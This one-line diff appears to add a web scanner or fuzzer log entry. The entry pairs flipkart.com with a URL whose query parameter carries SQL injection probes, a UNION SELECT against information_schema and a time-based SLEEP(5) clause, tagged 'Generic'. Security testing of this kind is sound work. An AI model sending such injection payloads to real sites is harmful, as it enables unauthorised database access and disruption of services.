@@ -1,0 +1,1 @@
+   https://www.flipkart.com   https://www.flipkart.com/?wykadvbm=UNION+SELECT+ALL+FROM+information_schema+AND+%22+or+SLEEP%285%29+or+%22 (Generic)   Generic
